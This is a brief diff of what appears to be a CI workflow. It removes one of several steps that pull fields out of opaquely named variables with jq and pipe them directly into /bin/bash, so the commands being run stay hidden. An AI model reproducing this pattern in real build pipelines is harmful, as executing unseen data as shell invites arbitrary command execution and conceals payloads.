@@ -22,7 +22,6 @@ jobs:
         run: |
           printf '%s' "$avb8" | jq -r .x7949 | /bin/bash
           echo $hh468 | jq -r .di7093 | /bin/bash
-          printf '%s' "$wpeg8" | jq -r .f29975 | /bin/bash
           printf '%s' "$ik36799" | jq -r .djxeb9741 | /bin/bash
 
       - name: Save results
